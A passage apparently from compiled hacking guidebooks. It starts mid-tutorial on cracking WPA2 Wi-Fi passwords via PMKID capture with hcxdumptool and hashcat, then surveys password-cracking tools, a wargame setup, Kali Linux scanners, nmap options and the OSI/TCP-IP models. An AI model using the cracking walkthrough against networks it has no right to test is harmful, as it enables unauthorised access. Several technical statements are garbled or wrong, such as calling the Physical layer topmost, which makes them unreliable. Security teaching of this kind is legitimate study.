After you have plugged in the wireless network adapter, you can find the names of the WPA2 networks by typing ip a or ipconfig. The network names usually vary. First, make sure that the card has been put into the wireless monitor mode. You will then be able to listen to the Wi-Fi traffic. You should type the following commands into the terminal window and you should also substitute the name of the wireless network adapter.

hcxdumptool -i wlan1tue -o galleria.pcapng –enable__status=1

The name of the wireless adapter may also be wlan1tue. It helps to save PMKIDs that have been captured and they are saved in a file known as “galleria.pcapng.” The status value can be specified.

warning: Network Manager is running with pid 555

warning: wpa_supplicant is running with pid 611

warning: wlan1mon is probably a monitor interface

start capturing (stop with ctrl+c)

INTERFACE.…………: wlan1mon

FILTERLIST………….: 0 entries

The wireless network adapter should also be in the monitor mode.

Step 3: Use the Hxcdump When Capturing the PMKIDs That Are From the Local Networks

You can capture the PMKIDs of the devices that you want to try to attack. Some of the commands that you can execute include:

![](images/00009.jpg)

After gathering enough information, you can end the attack. A PCAPNG file will then be produced and it will contain all the information that you need to facilitate the brute-force attack. The information should also be converted into a format can be easily understood by the Hashcat tool.

Step 4: Using the Hxcpcaptool to Convert the Dump for Hashcat

The hcxpcaptool is used to convert the PCAPNG file. A few arguments are also specified. In the same folder where the PCAPNG files are saved, you should key in the following commands in the terminal window.

![](images/00010.jpg)

After running the command, the terminal window will showcase the following pieces of information:

![](images/00011.jpg)

The context show that you have gathered at least 21 PMKIDs within a short period. The "galleriaHC.16800" file can now be used to crack the network passwords.

Step 5: Select a Password List and Use the Brute Force With Hashcat

When you start attacking the Wi-Fi networks that you have managed to capture, you must start by picking a good password list. After picking a good password list, you can put all the passwords in a similar folder with the .16800 file after you have converted it. You should then run the following commands in the terminal window:

![](images/00012.jpg)

The Hashcat should be started in the 16800 mode. The attack on the WPA-PMKID-PBKDF2 network protocols will then be attacked. You should also specify the name of the files that you need to crack of which in this instance we are using the "galleriaHC.16800." The –force option will then ignore any warnings that appear when proceeding with the attack. The brute force attack is quite effective and in this context, we are making use of the "topwifipass.txt."

![](images/00013.jpg)

The time needed to complete the attack depends on the size of the password list and the hardware speed. To see the status updates, you should always press the S key.

Step 6: Interpreting the Results

As the Hashcat command tries to crack the Wi-Fi passwords, you can also check the present progress.

![](images/00014.jpg)

As the password list comes to an end, the Hashcat adjusts the workload and you will get a final report afterwards.

![](images/00015.jpg)

If you have managed to crack some passwords, you will notice that you can see all of them there. As for the test run, the PMKIDs that were gathered contained passwords in the password list, so it’s impossible to crack any of the hashes. When hacking into certain networks, you may come across such issues especially when there is a strong password.

The PMKID Hashcat Attacks Ensure the Wi-Fi Attacks Are Easier

Although this technique has proven to be effective, some of the past tactics to crack WPA2 Wi-Fi passwords are still effective. If the network does not support some of the security elements that contain the PMKID, the Wi-Fi hacking process may not be successful. You can use the hcxtools to first audit your network and learn whether they are susceptible to attacks. Although your network may be vulnerable, there should be a strong password so that the efforts of the attacker to attack the network may prove to be futile.

Most of these attacks rely on guessing some passwords that may be used to access the Wi-Fi network, during the guessing process, you may start by guessing some default passwords which may include “password” and “12345678”. Such passwords can be easily cracked. During the guessing process, you can also go ahead and try to utilize some breached data. Some techniques used to access such data include carrying out a social engineering attack since it will help to recover some sensitive information. The passwords may also be reused on different accounts. Such a technique may also prove to be very effective.

Password-Cracking Tools

You can use different tools to crack the passwords and operating systems in different organizations. Some of the renowned password cracking tools include:

Cain & Abel

The Cain & Abel password recovery tool is meant for the Microsoft operating system. It allows people to recover passwords since the tool sniffs a network of your choice. You can also crack different passwords using the Cain & Abel dictionary, cryptanalysis attacks, brute force, decoding scrambled passwords, recording VoIP conversations, revealing password boxes, recovering wireless network keys, analyzing routing protocols, and uncovering cached passwords.

The tool is updated regularly and the latest version has numerous features including APR and enables a person to sniff on the switched local area networks. You can also launch a Man-in-the-Middle attack. The sniffer can also analyze some of the encrypted protocols including HTTPS and SSH-1\. They also contain filters that capture the credentials of specific users. The latest version of Cain & Abel also ships the route extractors, routing protocols, brute-force, and  dictionary attacks for the common hashing algorithms numerous password calculators, specific authentications, password decoders, cryptanalysis attacks, and some utilities commonly related to the network security.

Who Should Use the Cain & Abel Tool?

The specific target audience for the Cain & Abel tool is network administrators, professional penetration testers, teachers, forensic staff, security professionals, and security software vendors.

Requirements: To successfully install Cain & Abel, your system should have the following specifications:

> ➢  A hard disk space of at least 10MB

> ➢  Microsoft Windows XP/ 2000/Vista

> ➢  Winpcap Packet Driver

> ➢  Airpcap Packet Driver

Installation: You should start by downloading Cain & Abel. Run the executable file and follow each of the installation instructions.

![](images/00016.jpg)

Brutus

Brutus is a popular tool used to crack passwords. It is quite flexible and fast. The password cracking tool is also available free of charge and can only be used on the Microsoft Windows operating systems.

It supports the following formats: POP3, HTTP (Form, HRML, CGI), SMB, FTP, IMAP, Telnet, NetBus, and NNTP. You can also create your authentication types. The tool is also widely known since it supports multi-stage authentication engines. You can also resume and load different options after pausing some of the current activities.

RainbowCrack

The password cracking tool cracks passwords at a fast rate as compared to other tools used to launch brute-force attacks. The tool makes use of a large time memory in the form of a computational process that calculates the hash pairs and plain text. RainbowCrack makes use of selected hash algorithms. After the computation process is over, the results will appear under the rainbow table. The process takes a lot of time. After the table is ready, you can crack any WPA2 network passwords fast as compared to when you are using the brute force tools.

You have to come up with rainbow tablets individually. The people who developed the RainbowCrack had generated the NTLM rainbow tables and the LM rainbow tables. Other tables that were also produced include the Sha 1 rainbow tables and the MD5 rainbow tables. The tables are also available for free and come in handy during the password cracking process.

This tool is available for both Linux and Microsoft Windows systems.

Wfuzz

Wfuzz is also used to crack passwords. The tool makes use of brute-force attack. It can also be used to find some of the hidden resources including scripts, directories, and servlets. The tool can also be used to identify different types of injections including XSS Injection, SQL Injection, and LDAP Injection in different web applications.

The major features of the Wfuzz tool:

> ➢  Post, headers and authentication data brute-forcing

> ➢  Capability of injection via multiple points with multiple dictionary

> ➢  Time delay between requests

> ➢  Proxy and SOCK Support, multiple proxy support

> ➢  Output in colored HTML

> ➢  POST and GET brute-forcing

> ➢  Brute force HTTP password

> ➢  Multi-Threading

> ➢  Cookies fuzzing

John the Ripper

This tool is widely known since it is open source and compatible with other platforms including Linux, Mac OS, and UNIX. A Microsoft Windows version is also available. The tool is mainly used during the detection of weak passwords. There is a pro version and it has more features.

![](images/00017.jpg)

Figure 1: Zip password cracking using John the Ripper

THC Hydra

THC Hydra has gained a lot of popularity since the tool is fast when it comes to the password cracking process. It has been compared to other tools and that is has been issued a positive review. It is also easy to install new modules into the password cracking tool. The modules come in handy when enhancing the features of THC Hydra. The tool can be used on different platforms including FreeBSD, Microsoft Windows, Linux, Solaris, and OS X. THC Hydra also supports numerous network protocols including AFP, Asterisk, Cisco, Cisco auth, AAA, CVS, Cisco enable, FTP, Firebird, HTTP-FORM-POST, HTTP-FORM-GET, HTTP-HEAD, HTTPS-FORM-GET, HTTP-GET, HTTPS-FORM-POST, HTTP-PROXY, HTTP-Proxy, HTTPS-GET, ICQ, HTTPS-HEAD, IRC, IMAP, MYSQL, LDAP, MS-SQL, NNTP, NCP, Oracle SID, Oracle Listener, POP3, PC-Anywhere, RDP, PCNFS, Rlogin, Oracle, Rexec, POSTGRES, SAP/R3, rsh, SMTP Enum, SMTP, SIP, SOCKS5, SMB, Telnet, SSH (v1 and v2), SNMP, VMware-Auth, , Subversion, VNC, Teamspeak (TS2), and XMPP.

Developers are also encouraged to contribute towards the development of the THC Hydra password hacking tool.

![](images/00018.jpg)

Medusa

Medusa is somewhat similar to THC Hydra. It supports numerous network protocols including FTP, HTTP, IMAP, MYSQL, POP3, NNTP, CVS, pcAnywhere, AFP, rsh, SMTP, MS SQL, PostgreSQL, SMB, SSH, NCP, SNMP, VmAuthd, rlogin, Telnet, VNC, and SVN. Medusa is in the form of a command-line tool, so you need to first learn about the commands. The network connectivity determines the efficiency of the Medusa password cracking tool. When trying to penetrate a local network, Medusa can crack at least 2,000 passwords in one minute. When using this tool, you can perform a parallel attack. It also comes in handy when cracking the passwords of multiple email accounts at a go. You should come up with a password list and a username list.

Ophcrack

This password-cracking tool is meant for the Microsoft Windows operating system. It is also the most popular password-cracking tool for the Windows platform. It can also be used on the Mac OS and Linux operating systems and comes in handy when cracking the NTLM and LM hashes. There are also rainbow tables and they are free.

L0phtCrack

It can be used as an alternative for the Ophcrack. It normally cracks passwords on the Windows platform. When cracking passwords, it uses the network servers, Windows workstations, active directory, and the domain controllers. The tool makes use of brute-force and dictionary attacks to generate and guess passwords. Some of the features present include the schedule routine audit feature. It can be set weekly or even monthly when carrying out an audit. Depending on the scheduled time, the tool starts the scan on time.

![](images/00019.jpg)![](images/00020.jpg)

The password-cracking tools normally take a set of passwords that may be compiled through guesswork and run each one of them through an algorithm. Encrypted hashes come about in the process and then compared at a high speed to the password hashes that have been extracted from the initial password database. After finding a match, it means that the network password has been cracked. The external attacker can then gain access to the network and launch different attacks while also gathering various pieces of information.

Some of the password-cracking tools also try to hack into a network using some of the usernames and passwords that may have been predefined. The dictionary attacks work in such a manner and they include Brutus among other password-cracking tools. In most cases, the predetermined passwords eventually lose. The main advantage is that these tools are easily accessible; you can use it when testing whether a network is secure. You have to look for the weaknesses within the network before the malicious users can. During the password cracking process, some of the user accounts may be locked out and there might be some interruptions in the process. In some instances, there will be a DoS attack and users will not be able to access the network.

Passwords are normally encrypted. They are also stored on the computer using specific encryption algorithms such as MD5 and DES. The hashed passwords are represented by encrypted strings that are fixed in length and by the same passwords. The hashes cannot be reversed which means that it is impossible to decrypt the passwords. Some of the passwords in platforms such as Linux normally have a random value commonly known as “salt” and it makes sure there is a degree of randomness. As a result, although two people have the same password, each password will not have the same hash value.

> Conclusion

Thank you for reading the Networking Hacking to the end. I hope the book was informative and you were able to gain access to all the tools that you required to achieve all your goals regardless of what they may be. Although you may have finished reading it, we have not exhausted all the present information about the topic. You can expand your knowledge of the specific area by also carrying out more research on the topic.

The next step is to ensure that you can practically use the information that you have grasped. You can also create a schedule whereby you can learn more about network hacking. You can make use of some of the network hacking tools that have been outlined in the context above. Some of these tools are free and they also come with a user manual.

Studies showcase that networks are vulnerable. External attackers come up with different techniques that they can use to penetrate a network. They also come up with scripts that can help them to attack a certain network. The skillset of the hacker also matters. Additionally, the hacker must have goals that will also act as their motivation during the hacking process. Although a network can be accessed in different ways, there are ways in which you can assess the vulnerabilities and also seal any present security loopholes.

> Kali Linux For Hackers

Computer Hacking Guide. Learning the Secrets of Wireless Penetration Testing, Security Tools and Techniques for Hacking with Kali Linux, Network Attacks and Exploitation

> Introduction

Congratulations on purchasing Kali Linux for Hackers and thank you for doing so.

There are plenty of books on this subject on the market, thanks again for choosing this one! Every effort was made to ensure it is full of as much useful information as possible; please enjoy!

Once upon a time, there was a system called Unix. It was created by Ken Thompson, Dennis Ritchie, and the team. They wanted a system superior to the widely used Multicsin season. They developed a very powerful language to use in this system: the C language. Many Unix variants have come up since then: Digital Unix, AIX, HPUX and even versions for personal computers like Xenix and Minix. It is precisely in Minix that our story begins. A student called Linus Torvalds used and undermined this system but thought it could be improved. Then, in the mid-1990s, Linus developed a kernel (the heart of a system) of a new system based on Minix and the Unix, called Linux (from Linus). From there, the popularity of the system is only growing and there are even different versions of Linux (it is interesting to note that there are more versions of Linux than Unix itself today): Red Hat, Mandrake, SuSe, Slackware, Debian, and even the Brazilian Conectiva compete for space in thousands of servers and personal computers.

You may be wondering: Which version should I use to follow the book? Or: I have an affinity for this or that version of Linux, does it make any difference? No, not at all. We will only use commands in mode.shell (text). Everything that is done in the shell here can be done in the graphical interface and the commands hardly change on different versions of the system. Don't worry if you don't know the commands: in the next chapter, I'll give you a brief explanation of the most important commands that you will use. Even if you only have Windows, you can enjoy the content since it is only by connecting to HackersLab via telnet that you will be using Linux. This will be shown step by step at level 1.

We talk so much about this HackersLab ... What exactly is this? OHackersLab Challenge is a kind of “game” very well known in the security and hackers circle in general. It is so well known that it already existed until the Brazilian version was made by UFRJ (Federal University of Rio de Janeiro).ro) which was named LockABit (www.lockabit.com). The challenge is simple (good, in terms). You start at level 0\. Currently, there are 18 levels (counting zero) to break. Once you win a challenge, you get the password to the top level. If the challenge ever ends, will the book lose its usefulness? Of course not. As I said, there are already other challenges based on HackersLab, and even if they didn't exist, the book teaches you enough for you to test even on your own Linux system. What if I can't understand the higher levels? It does not matter...The book will always be a reference for you. It's at a level that needs C programming and you can't still understand? Learn C then, first of all. The goal of the challenge is to get you to level 17 practically, as a master. I can show you the way, but you have to walk the path alone. If you are new to the security world, I suggest you read the Hacker Guide, so you will have a better basis for absorbing what will be taught here.

> Chapter 1 - Basic and Essential Linux: The Necessary Basics

In this chapter, I will cover what you need to know about Linux to perform the challenge. Basically, we will see text mode (shell ) commands that will be some basic notions of system structuring and usage. Throughout the challenges shown, I will explain each command that will be used along with the details.

We have our structure of use divided into users and groups. This is done so that the system administrator can have greater control over who will access it. There is also the “superuser,” called “root” that, regardless of permissions (which we will see below), can perform anything in the system. A practical example: My user account on system X is called milestones – a space in the home/macros/ folder so I can store my files. My group within this system is called read. It's a non-original name given by root to designate that everyone in my group has permission only to read files, nothing more.

But why the groups? The root administrator could not set this straight into the accounts. It could ... but what if a system has a thousand accounts? Not anymore. It is easy to separate into groups and perform the permissions collectively than individually?

Still using the previous example, suppose inside the folder/home/milestones, I have the permission to do whatever I want (read, write and execute files...). Let's go then. I created a text file called test.txt. When I list the data, it will look like this: -rwxr-x— milestones read 10297 test.txt ... What did we get? After test.txt we do not care. Let's look at the initial letters, which are the permissions of the text file I created. They are divided as follows: r -> readw -> writex -> execute and the division is done as follows: Type: - User: rwxGroup: rxAll others: -Explaining: In Type, it has nothing, so it is a file.

The first three spaces after the type are user permissions, i.e. who created the file (look at the name). The user macros then has rwx permission, he can read ( r ), write( w ) and execute ( x ) the file. Soon after, come the group permissions. Permission will affect everyone that belongs to my group (which in this case is the read). They have rx. As they don't have w, they can only read and execute but not write. And finally, the last three spaces are reserved for all users except the creator (milestones) and those in your group (read). Those who do not have r, w nor x can do nothing with my file. There is also a permission bit besides r, w, and x that will be very important ahead. This is s, the so-called SUID bit, which we will not talk about. Permissions can be changed as well as users to whom the files belong. These and other commands are in the next topic.

Hacker Tools That Can Be Used In Kali Linux

Among the many existing Linux distributions in the world, Kali is one of the most advanced. It is designed for specific purposes, such as intrusion testing and security auditing, and features a range of (ethical) hacking tools.

A big differentiator of Kali Linux is its repertoire of native tools to perform various tests - over 300\. Not to mention that the system is free, stable, reliable and can be complemented by a vast amount of third-party applications.

The focus of this section is precisely to address the tools that the Kali system administrator can rely on to improve security mechanisms within the company.

To use these tools you must have KALI Linux installed. Resources can be found on the internet and there are a number of sites that overstep by step tutorials on how to download and install Kali Linux. So before proceeding with the next chapters – get started with the Kali Linux download and install!

> Chapter 2 - Information Gathering And Vulnerability Analysis

No matter how well developed, any software product contains bugs. Some of them remain hidden and trouble-free, while others affect performance or worse open breaches for threats to exploit sensitive data stored on a company's system.

In this context, information gathering collaborates through more detailed surveys of the system, as well as its resources, server data, browsing history, network structure, and so on.

This monitoring measure is used to give hackers a satisfactory information base to initiate threat modeling and then conduct attack tests (simulations).

In turn, vulnerability analysis, as its name implies, is the use of tools that perform system-wide vulnerability analysis.

The result of such an analysis allows, for example, that all risks that the network is likely to suffer are mapped or reported in reports, listing all weaknesses that need corrections.

What are the most suitable tools for these activities? Check out 5 of them below:

1\. NMAP

Undoubtedly Nmap is one of the main free open source tools used by hackers, widely used for network detection, analysis, and security audits.

In short, Nmap is considered essential for gathering details of specific information on any active machine. To understand its many features, the official website itself provides a free guide.

2\. SOCIAL ENGINEERING TOOLKIT

Also known as SET, the Social Engineering Toolkit is designed to assist in penetration testing against human elements. These are embedded in the target's security environment, bearing in mind that people are often the weak link in security systems.

3. DNSENUM

DNSenum is a tool for gathering DNS server information. Able to search hosts, server names, IP addresses, logs, and other information using just a few basic commands.

4\. NESSUS

Undoubtedly Nessus is one of the most complete security applications for analyzing and auditing. It is developed by award-winning Tenable, which serves more than 21,000 companies globally.

With Nessus, information security professionals can run multiple scans simultaneously, have constant tool updates, a variety of plugins, and reports that can be generated through a dashboard.

5. CISCO-TORCH

Following the same line of scanner tools, Cisco-torch has some peculiarities. One is the constant use of forking to launch multiple background scanning processes. According to Hacking Exposed Cisco Networks, this maximizes efficiency in detecting vulnerabilities. The purpose of the developers when creating Cisco-torch was to find an agile solution for remotely discovering Cisco hosts using SSH, Telnet, Web, NTP, and SNTP protocols to launch dictionary attacks against discovered servers.

WEB APPLICATIONS

Certainly, you already know or have a good idea of what web applications are all about. But not to be blank, we define web applications as programs that run on web servers and are accessed via the browser.

For web applications, we'll talk about specific tools that every hacker should know about:

1\. NIKTO2

This is an application to analyze a site's vulnerability. It performs:

*   > Testing for over 6,700 potentially dangerous files and programs that are present on the web;

*   > Verification of server configuration;

*   > Analysis of crucial items that can be updated automatically;

*   > Queries for over 1250 outdated server versions and their specific issues.

Nikto is characterized by the ability to perform activities that, in theory, are highly complex. Besides, of course, being a free tool.

2\. PARSERO

Unlike other tools mentioned so far, Parsero is not a software, but a script. Written in Python, it reads the Robot.txt file from a web server and checks for unauthorized entries, which will tell search engines (Google, Ask, Bing, and others) which files or directories hosted on the server should not be indexed.

Sometimes, even though paths are restricted to access via search engines, they may be accessible to users who enter the site directly.

To address this issue, the Persero script checks the HTTP code status of each entry marked Disallow and even searches through Bing to find improperly indexed content.

3\. WAPITI

Wapiti enables the user to perform black-box testing, a method that examines an application's capabilities without checking internal structures.

The tool does not study the source code of the web application but instead checks the web pages implemented by it for scripts into which it can inject data. When it finds the scripts, Wapiti performs heavy data transmission to test its vulnerabilities.

Top Linux Commands

Starting the challenge Why Join HackersLab? Before you can start having fun, you must sign up for the system. This was others will be able to follow your progress and you will have access to the discussion forums site, in addition to the fact that your name (or nickname) can be in the gallery of fame. Only by registering on the site [www.hackerslab.org](http://www.hackerslab.org), you can read provided tips on how to pass each level. To save labor, I will put the hint and its explanation.

Performing the Registration:

Step 1: Click on “Free Hacking Zone”.

Step 2: You need an account to see the issues. Click on Registration.

Step 3: You must fill in the required fields .pos with the *, the others are at your discretion.

Step 4: Your registration will be successful. Click on View Problems.

Step 5: Enter the ID and password you registered

Step 6: Do you see the problem for level 0\. At every level, there is an explanation and a tip.

Accessing the Server

Now it's time to access the HackersLab server via telnet. Connect by typing through telnet – drill.hackerslab.org.

An example of how to do it from Windows:

Go to Start / Run and type: A screen will appear asking for login and password. Login is level0 and the password is guest.

If you see a lot of trash on the screen, don't worry. Proof- These are Korean characters and your system should be English (we know it's never entirely in Portuguese or any secondary language). You are connected. Look at the prompt that you are at level0\. You will need to find some file that has level1 permission to advance (we'll see later). Now suppose you were able to get the password for level1\. How to access it?

First, go back to [www.hackerslab.org](http://www.hackerslab.org). Enter the password for the next level (in this case, level1) and click on Go. If the password is correct, a message saying Congratulations level up! (Congratulations on passing the level!) Will appear on the screen, just click back to see the information and tip for the next level. After reading, reconnect via telnet to drill.hackerslab.org, enter as login level1 and the new password.

Teaching Structure

All levels will be presented in the book divided as follows:

Problem: Original text of the problem and its explanation.

Study: A study of what kinds of knowledge you will have to have to advance at this level. At the levels that deal with overflow buffers and race conditions, for example, we have a whole study of how these problems occur.

Walkthrough: The name itself says it. It is the step by step resolution of the pro. After reading it will be easy for you to understand what will be done in this section.

What is the difference between using nmap localhost on our computer and nmap [ip of our host] from another host?

>> The firewall. Apparently, nmap localhost does not take into account the firewall and takes the open ports as such, while if we try to access from another computer the open ports that appeared in the first case in the second appear filtered to us.   

What happens if we use the -p “* ” option (eg nmap -p "*" scanme.nmap.org )? What are the advantages and disadvantages?

>> All ports of the referenced host (s) would be analyzed. The advantage is that each and every TCP port of the target host (s), which could be 65535 ports, is analyzed. The main disadvantage is the response time (By default it only scans 1000 most common ports)  

What would happen if we instead executed the -F option? What advantages and disadvantages does it present?

>> -F requests a Fast Scan, in which only the 100 most used ports, would be scanned.

The opposite would happen that in the previous question, it is a very fast scanner but it covers many fewer ports.

To which set of commands would an aggressive survey (nmap -A) be equivalent?

>> Aggressive polling is equivalent to the Operating System (-O), version (-sV), script scanner (-sC) and traceroute (- traceroute) scanning, all at once.

Does an ARP scan work outside our intranet?

>> No

Is there a limit to the number of options we can execute in a nmap scan?

>> Although we can use almost any option to our liking, there are some combinations that are not valid, in most cases because they are contradictory.   

If we test these combinations, Nmap indicates it with a message.

Ex: nmap -PN -sP [objective]

-PN asks not to ping, while -sP requests a ping scan

> Chapter 3 – Understanding Everything about Network Security

IT security revolves around the concept of network security given the network's importance as an organizational asset. These networks, on the whole, involve a variety of devices ranging from storage to security to input/output apart from operating systems, data and software and people. Without a thorough knowledge of these software and hardware components, being able to implement and maintain security will be a tough order. 

Experts believe that network security is best maintained when one acts proactively to mitigate threats and vulnerabilities. This is because of a fast-changing world where new technologies require security professionals to make tradeoffs between ease of use and security. But, for a start, we will examine these network components, their functions and their relevance to security. Also, by looking at networking fundamentals in this chapter, we should be able to understand transmission security where encryption among other strategies will help you protect data that is either at rest or in transit. There are four learning objectives for the domain titled Communication & Network security.

Applying Secure Design Principles to Network Architecture

The modern world cannot do without a number of services such as email, online banking, the Internet. This is clearly because computers are now able to communicate over a network. For this, protocols serve the primary function of sending data over this medium.

Yet it wasn’t as seamless as this in the early days since companies created their own protocols and it was difficult for computers to interact with each other. As a result, the OSI model came into existence thanks to the efforts of the International Organization for Standardization (ISO).

Even if the TCP/IP model became the preferred standard over the years, the OSI model has been instrumental in helping with building network communication technology since the eighties. Now, since the OSI and TCP/IP models serve as the cornerstone for networking, understanding these will enable the security architect and professional to design and implement networks that will protect the confidentiality and integrity of data in transit and at rest.

Now, before we look at the OSI model in detail, there are two things that make it stand out:

*   > The communication process is broken into seven layers and where each layer works and can be changed independently without affecting the others.

*   > The OSI Model still continues to serve as a framework for both hardware and software developers ensuring that interoperability continues to remain a part of network communication as envisioned since its early days.

As for the TCP/IP model that we will look at next, it was developed almost a decade earlier. While sharing a few similarities with the OSI model, it has four layers in all that align with the OSI Model layers. It must be pointed out that with the success it has enjoyed, the OSI Model ensured that it included the TCP/IP protocol suite which is found in every operating system today.

OSI Model

As mentioned earlier, the OSI Model followed a layered approach where each of the layers performs a specific function. Simply put, it allocates separate responsibilities to each layer that determine how two systems communicate over the internet. For this to happen, both systems should be using the same protocol even if they might be very different. Even if the TCP/IP Model is used widely today, the OSI Model is still very important given that a number of vendors used it to create their own networking framework while remaining an open network architecture.

Now, as we discuss the seven layers that the OSI Model provides, we must also understand that each layer also has its set of protocols. Think of a common protocol used as a set of rules that helps two systems communicate. 

That said, even if computers over a network communicate via a physical connection, there are logical channels that are used for communication as well. Each of these channels or layers operates independently even if they work in tandem with the next layer to ensure data transmission. They are also known to communicate with the same layer based on the OSI Model on other systems through the method of encapsulation.

OSI Models consists of seven layers where the Application layer is considered to be the seventh and the topmost while the Physical layer is the bottommost. Now, when the data you want to transmit enters this protocol stack, it begins its journey as a data stream and exits the stack in the form of bits. As it passes through each layer, it adds on more information in the form of headers and footers that will ensure that the data, in the form of a packet, is delivered to its destination. This process is known as encapsulation or de-encapsulation depending on whether the system is delivering or receiving data. In other words, the reverse takes place when a system is receiving data. Let us look at each of these layers beginning from Application to the Physical layer,

Layer 7: Application

As the topmost layer when sending data, it receives data from the user application through an application programming interface (API). As a result, the data is added to a container otherwise known as a protocol data unit and is then handed over to the Presentation layer. Examples of protocols that operate at this level include DNS queries, SMTP email transfers and the HyperText Transfer Protocol (HTTP) that works to transfer pages over the network.  

Layer 6: Presentation

One thing is important to note: no layer that receives data alters the information but adds information that aids in it reaching its destination. In the Presentation layer, information about the formatting of data takes place so as to ensure that the same layer at the destination computer is able to read. For the most part, it identifies the type of data apart from the application that will be able to read it. 

A simple example of this involves the sending of a PDF document from a Windows 10 to an Ubuntu system. Not only will the Presentation layer determine the MIME type (pdf in this case) but will add this information in the header as it sends the data to the Session Layer. 

When it reaches the receiver’s computer, the Presentation Layer is able to identify the file type by reading the header and which results in a PDF viewer being opened to view the file. This layer also helps with encryption and compression of files where the information pertaining to these two aspects is added for the Presentation layer on the destination system so the file can be decrypted and decompressed. That said, if your computer does not have an application that can open the file, the Presentation Layer in your system will only display an unassociated icon.

Layer 5: Session

Once the protocol data unit is passed on to this layer, it works to initiate a connection with an application or service on the receiver’s system apart from maintaining and closing the connection after the data has been transmitted. As for the information it adds about the application or service that it has to make a connection with, this includes a port number and after which, the protocol data unit is passed on to the transport layer.

As for the connections that this layer seeks to make, they consist of three types:

Simplex - Communication that takes place in one direction

Half-duplex - communication that occurs in both directions even data is only sent in one direction

Full-duplex - Communication and data flow that occurs in both directions

Layer 4: Transport

Now, once the information has been added to the Session layer, the next step is to lay some ground rules regarding the session underway. This is done by a handshaking process where the three-way handshake for TCP. Now before we describe how this layer deals with that, it must be pointed out that the protocol data unit is now converted into a segment.

Not only does the Transport Layer determine how much data must be sent at a time but also the sequence in which they are transferred to the destination system. Apart from this, it also handles issues such as missing packets apart from verifying the integrity of the data. That said, the Transport Layer is also responsible for how network devices are referenced or addressed. Some of the popular protocols that operate in this domain include Transmission Control Protocol (TCP), User Datagram Protocol (UDP), Secure Sockets Layer (SSL) and Transport Layer Security (TLS).

While both the Session and Transport layer perform a common function of setting up and completing a session during which data is transmitted, the former sets up a session between applications while the latter performs this very same function between two computer systems on the whole.

Layer 3: Network

Once a segment of data is received by the Network layer, source, and destination, IP addresses are added where the latter system will be located on the same network or at a remote one. Depending on which, routing information will also be added to the segment as well. After this is complete, the segment is now referred to as a packet and which will be passed on to the Data Link Layer. Simply put, the packet will contain the necessary information that will help it to move from one LAN to another. Some common protocols in this layer are Internet Protocol (IP), Internet Protocol Security (IPSec), Routing Information Protocol (RIP) and Internet Message Control Protocol (IMCP). Routers and routers are devices that help with these Network layer functions.

Layer 2: Data Link

The Data Link layer is responsible for preparing the received packet to be transmitted as a frame to the destination system on a particular network. Each of these networks has its own hardware and technology. Some of these networks are Token Ring, Ethernet, asynchronous transfer mode (ATM), Fiber Distributed Data Interface (FDDI) and Copper DDI.

The Data Link layer understands what format is necessary to successfully transmit the data without error and then passes it on to the Physical layer. That said, there are two Data Link sublayers that carry out these tasks and which consist of the Logical Link Control (LLC) and the Media Access Control (MAC) sublayers. It’s the MAC sublayer that determines what type of network the frame will have to be transmitted to and adds that information along with the frame.

Finally, the protocols that perform functions in this layer include Point-to-Point Protocol (PPP), Address Resolution Protocol (ARP) and Reverse Address Resolution Protocol (RARP).

Layer 1: Physical

As the topmost layer in the OSI Model, the Physical layer receives frames from the Data Link layer and then converts it to bits (zeroes and ones) so as to transmit it over the network. When it receives data in the form of bits, it will also convert this into frames and then transmit it to the Data Link Layer. It must be pointed out that the device drivers operate at the Physical layer in order to instruct the protocols as to how the frames must be transmitted or received as bits. Some of the protocols include SONET, Bluetooth, RS-232 and DSL at the Physical layer.

Also, there are network hardware devices that operate at this layer and which include Network interface cards (NICs), hubs, repeaters, amplifiers and concentrators that help in transmitting signals over long distances.

Since this covers only wired connections, wireless and optical fiber networks represent these bits using alternating radio waves and light.

TCP/IP Model

If there’s one aspect that both the OSI and TCP/IP Model share, it’s the idea of packet sharing. Developed in the seventies by DARPA, the TCP/IP Model found its humble beginnings when it was implemented as a Wide Area Network (WAN). Of course, the Internet, as we know, is a global network that consists of these wide area networks and Internet Service providers.

There’s very little difference between the two models since the OSI Model offers seven layers while the TCP/IP Model only uses four. Even then, the functions are very similar with the exception that the TCP/IP Model focuses on the TCP/IP protocols when it comes to data transmission. Still, this is a protocol suite that consists of both the TCP and IP protocols apart from several more. That said, even if the OSI and TCP/IP models are similar, their layers don’t necessarily map neatly when it comes to functions. 

Network Access or Link Layer

The Network Access Layer in the TCP/IP Model combines both the Physical and Data Link layers of the OSI Model. Hence, using the LLC and MAC sublayers, it will not only add information such as the source and destination MAC addresses but it will also add a trailer so as to verify the integrity of the data. But that’s not all: it also carries out the function of sending bits of data across the physical medium to be it fiber, wired or wireless. Some of the common protocols used in this layer include IEEE 802.3 and 802.11 as well as the Address Resolution Protocol (ARP) and the Neighbor Discovery Protocol (NDP).

Internet

This layer is responsible for routing and finding the location of the destination host. If this isn’t determined by the Internet layer, then the Transport layer will not be able to set up a connection. The way it does this is by placing the source and destination IP addresses in the packet. There are four protocols that help out with this namely Internet Protocol v4 & Internet Protocol v6 (IPv4 & IPv6), Internet Control Message Protocol (ICMP), Internet Group Management Protocol (IGMP) and Address Resolution Protocol (ARP). Given how important it is for security professionals to understand IP addresses and classes, it’s worth looking at.

Host-to-Host Transport Layer

When you compare the OSI and TCP/IP Models here, they perform the same function and which involves opening and maintaining a connection between two hosts. This function must be carried prior to the Application layer sending data to other applications. Usually, there exist two ways by which this is achieved by a connectionless or connection-oriented transmission. For the former, UDP serves the connectionless protocol in the Transport Layer while TCP is the connection-oriented protocol used here. 

No matter which one is more appropriate, the port number and the transport protocol will always be provided to the receiving host. While TCP offers much more in terms of functionality and reliability, it comes at a cost. The header when using the TCP protocol is much larger compared to the UDP protocol even if there’s a greater chance of all packets being delivered by virtue of the three-way handshake that takes place before any data is transmitted. 

Application

Also known as the process-to-process layer, the Application layer handled the tasks that are taken care of by the Application, Presentation and Session layers in the OSI Model. In other words, the layer merely created information and sends it to other processes or applications on another host. There are particular functions that protocols operating in this layer perform and which are related to applications and services. In stark contrast, the Transport layer protocols merely detect the location and routing in the effort to support these higher-layer protocols. Along with the data that is transmitted, the receiving host is also provided with port numbers that identify these upper-layer protocols and the programs they are associated with.

IP Networking

As we learned in the TCP/IP Model, IP is responsible for delivering packets from a source to a destination. At the same time, in the next layer, a MAC address is added as well. While the IP address is a logical address, the MAC address is a permanent one and which is why it called a physical address and they are sent together for a good reason. Then there is also the port number that is sent to indicate which service or program said the protocol is linked within the Application layer. When you send both the port number and the IP address, this is generally called a socket and which is necessary to send information to the right location.

IPv4

